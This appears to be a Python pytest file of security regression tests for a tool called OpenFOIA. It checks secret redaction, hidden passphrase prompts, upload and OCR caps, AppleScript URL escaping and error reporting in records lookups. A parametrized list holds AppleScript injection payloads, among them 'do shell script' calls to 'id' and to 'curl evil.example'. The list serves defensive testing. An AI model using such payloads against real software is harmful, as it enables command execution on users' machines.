"""Security regression tests: secret handling, DoS caps and shell safety."""

from __future__ import annotations

import pytest


# ---------------------------------------------------------------------------
# Secrets must not be printed or accepted on the command line
# ---------------------------------------------------------------------------

SECRET_CONFIG_KEYS = [
    "password",
    "api_key",
    "auth_token",
    "secret_access_key",
    "smtp_password",
]


@pytest.mark.parametrize("key", SECRET_CONFIG_KEYS)
def test_redact_secrets_masks_known_secret_keys(key):
    from openfoia.config import redact_secrets

    out = redact_secrets({key: "super-secret-value"})

    assert "super-secret-value" not in str(out)
    assert out[key] != "super-secret-value"


def test_redact_secrets_is_recursive():
    from openfoia.config import redact_secrets

    out = redact_secrets(
        {
            "gateways": {
                "email": {"smtp_user": "me@example.com", "_smtp_password": "hunter2"},
                "fax": {"_auth_token": "AC-secret"},
            },
            "encryption": {"password": "db-pass"},
        }
    )

    blob = str(out)
    assert "hunter2" not in blob
    assert "AC-secret" not in blob
    assert "db-pass" not in blob
    # Non-secret values survive so the output stays useful.
    assert "me@example.com" in blob


def test_redact_secrets_masks_underscore_prefixed_variants():
    from openfoia.config import redact_secrets

    out = redact_secrets({"_password": "x", "_api_key": "y"})

    assert "x" not in str(out.values())
    assert "y" not in str(out.values())


def _init_signature():
    import inspect

    from openfoia.cli import app

    for c in app.registered_commands:
        if c.callback.__name__ == "init":
            return inspect.signature(c.callback)
    raise AssertionError("init command not found")


def test_init_offers_prompting_flags_for_passphrases():
    """A passphrase must be obtainable without ever appearing in argv."""
    params = _init_signature().parameters

    assert "encrypt" in params, "no --encrypt flag that prompts for a passphrase"
    assert "duress" in params, "no --duress flag that prompts for a passphrase"


def test_init_password_options_hide_input():
    params = _init_signature().parameters

    for name in ("password", "duress_password"):
        assert params[name].default.hide_input, f"{name} must hide input"


def test_init_warns_when_passphrase_came_from_argv(tmp_path, monkeypatch):
    """If the user does pass it in argv, say so — it is in their history now."""
    from typer.testing import CliRunner

    monkeypatch.setenv("OPENFOIA_DATA_DIR", str(tmp_path))
    from openfoia.cli import app

    result = CliRunner().invoke(app, ["init", "--password", "hunter2", "--no-seed"])

    # Rich wraps to terminal width, so collapse whitespace before matching.
    output = " ".join(result.output.lower().split())
    assert "shell history" in output


# ---------------------------------------------------------------------------
# Upload / OCR resource caps
# ---------------------------------------------------------------------------


def test_upload_rejects_oversized_file(tmp_path):
    """A hostile 'response' must not be able to fill the disk."""
    import io

    from fastapi.testclient import TestClient

    from openfoia import server as server_mod
    from openfoia.server import create_app

    app = create_app(token="t", data_dir=tmp_path)
    client = TestClient(app, base_url="http://127.0.0.1")

    oversized = b"A" * (server_mod.MAX_UPLOAD_BYTES + 1024)
    resp = client.post(
        "/api/documents/upload",
        params={"token": "t", "request_id": "req-1"},
        files={"file": ("big.pdf", io.BytesIO(oversized), "application/pdf")},
    )

    assert resp.status_code == 413


def test_upload_cap_is_defined_and_sane():
    from openfoia import server as server_mod

    assert 0 < server_mod.MAX_UPLOAD_BYTES <= 500 * 1024 * 1024


def test_oversized_upload_leaves_no_partial_file(tmp_path):
    import io

    from fastapi.testclient import TestClient

    from openfoia import server as server_mod
    from openfoia.server import create_app

    app = create_app(token="t", data_dir=tmp_path)
    client = TestClient(app, base_url="http://127.0.0.1")

    oversized = b"A" * (server_mod.MAX_UPLOAD_BYTES + 1024)
    client.post(
        "/api/documents/upload",
        params={"token": "t", "request_id": "req-1"},
        files={"file": ("big.pdf", io.BytesIO(oversized), "application/pdf")},
    )

    leftovers = [p for p in tmp_path.rglob("*") if p.is_file() and p.stat().st_size > 1024]
    assert leftovers == [], f"partial upload left on disk: {leftovers}"


def test_ocr_has_a_page_cap():
    """Rendering an attacker-crafted 10k-page PDF at 300dpi is a DoS."""
    from openfoia.pipeline import ocr

    assert hasattr(ocr, "MAX_OCR_PAGES")
    assert 0 < ocr.MAX_OCR_PAGES <= 5000


# ---------------------------------------------------------------------------
# Shell / AppleScript safety
# ---------------------------------------------------------------------------

APPLESCRIPT_PAYLOADS = [
    'http://127.0.0.1:8000/?token=x" & (do shell script "id") & "',
    'http://127.0.0.1:8000/?a="\ndo shell script "curl evil.example"\n"',
    'http://127.0.0.1:8000/?q=\\" & (system attribute "HOME") & \\"',
]


@pytest.mark.parametrize("url", APPLESCRIPT_PAYLOADS)
def test_applescript_url_is_escaped(url):
    """The URL is interpolated into an osascript program — escape it."""
    from openfoia.browser import _applescript_string_literal

    literal = _applescript_string_literal(url)

    # A literal must be exactly one quoted AppleScript string.
    assert literal.startswith('"') and literal.endswith('"')
    inner = literal[1:-1]
    # No unescaped quote can terminate the literal early.
    assert '"' not in inner.replace('\\"', "")
    # No raw newline can start a new statement.
    assert "\n" not in inner and "\r" not in inner


def test_applescript_literal_round_trips_plain_url():
    from openfoia.browser import _applescript_string_literal

    assert _applescript_string_literal("http://127.0.0.1:9/?token=abc") == (
        '"http://127.0.0.1:9/?token=abc"'
    )


def test_browser_module_has_no_bare_url_interpolation():
    """No f-string may drop a URL straight into an AppleScript body."""
    import inspect
    import re

    from openfoia import browser

    src = inspect.getsource(browser)
    # Look for `set URL of document 1 to "{url}"`-style interpolation.
    assert not re.search(r'to\s+"\{url\}"', src), "raw URL interpolated into AppleScript"


# ---------------------------------------------------------------------------
# crossref must distinguish "no results" from "source failed"
# ---------------------------------------------------------------------------


def test_search_result_has_error_field():
    from openfoia.records.base import SearchResult

    import dataclasses

    fields = {f.name for f in dataclasses.fields(SearchResult)}
    assert "error" in fields


def test_adapter_failures_surface_as_errors_not_empty_results():
    """A failed lookup must not read as 'this entity is clean'.

    The conftest blocks real sockets, so this exercises the genuine transport
    failure path end to end rather than a stubbed seam.
    """
    import asyncio

    from openfoia.records.opencorporates import OpenCorporatesAdapter

    result = asyncio.run(OpenCorporatesAdapter().search("Acme Corp"))

    assert result.error, "transport failure was reported as an empty result set"
    assert result.entities == []
    assert result.total_results == 0


def test_sec_adapter_failure_also_reports_error():
    import asyncio

    from openfoia.records.sec_edgar import SECEdgarAdapter

    result = asyncio.run(SECEdgarAdapter().search("Acme Corp"))

    assert result.error
    assert result.entities == []


def test_sec_user_agent_does_not_advertise_the_tool():
    """Announcing 'OpenFOIA' to a government endpoint marks the requester."""
    from openfoia.records.sec_edgar import _edgar_headers

    assert "openfoia" not in _edgar_headers()["User-Agent"].lower()


def test_sec_user_agent_is_overridable(monkeypatch):
    monkeypatch.setenv("OPENFOIA_SEC_USER_AGENT", "Custom/2.0 (me@example.org)")
    from openfoia.records.sec_edgar import _edgar_headers

    assert _edgar_headers()["User-Agent"] == "Custom/2.0 (me@example.org)"
